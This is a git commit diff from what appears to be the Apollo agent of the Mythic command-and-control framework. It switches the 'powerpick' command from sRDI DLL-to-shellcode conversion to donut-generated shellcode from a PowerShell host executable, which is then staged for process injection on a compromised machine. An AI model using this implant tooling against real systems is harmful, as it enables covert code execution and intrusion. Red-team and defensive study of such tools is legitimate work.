b636e00b7457ccbdda38e0448d757ca76a76f6ef
Dwight Hohnstein <djhohnstein@gmail.com>
2021-10-17 12:59:38 -0700

    Update powerpick to use donut

--- Payload_Type/apollo/mythic/agent_functions/powerpick.py
+++ Payload_Type/apollo/mythic/agent_functions/powerpick.py
@@ -4,7 +4,7 @@ from sRDI import ShellcodeRDI
 from uuid import uuid4
 from mythic_payloadtype_container.MythicRPC import *
 from os import path
-
+import donut
 class PowerpickArguments(TaskArguments):
 
     def __init__(self, command_line):
@@ -42,17 +42,17 @@ class PowerpickCommand(CommandBase):
     browser_script = BrowserScript(script_name="unmanaged_injection", author="@djhohnstein")
 
     async def create_tasking(self, task: MythicTask) -> MythicTask:
-        dllFile = path.join(self.agent_code_path, f"PowerPick_{task.callback.architecture}.dll")
-        dllBytes = open(dllFile, 'rb').read()
-        converted_dll = ShellcodeRDI.ConvertToShellcode(dllBytes, ShellcodeRDI.HashFunctionName("InitializeNamedPipeServer"), task.args.get_arg("pipe_name").encode(), 0)
-        resp = await MythicRPC().execute("create_file",
-                                         file=base64.b64encode(converted_dll).decode(),
-                                         task_id=task.id,
-                                         delete_after_fetch=True)
-        if resp.status == MythicStatus.Success:
-            task.args.add_arg("loader_stub_id", resp.response['agent_file_id'])
+        exePath = path.join(self.agent_code_path, "PowerShellHost/bin/Release/PowerShellHost.exe")
+        donutPic = donut.create(file=exePath, params=task.args.get_arg("pipe_name"))
+        file_resp = await MythicRPC().execute("create_file",
+                                              task_id=task.id,
+                                              file=base64.b64encode(donutPic).decode(),
+                                              delete_after_fetch=True)
+        if file_resp.status == MythicStatus.Success:
+            task.args.add_arg("loader_stub_id", file_resp.response['agent_file_id'])
         else:
-            raise Exception(f"Failed to host sRDI loader stub: {resp.error}")
+            raise Exception("Failed to register execute-assembly DLL: " + file_resp.error)
+
         task.display_params = task.args.get_arg("powershell_params")
         return task
 
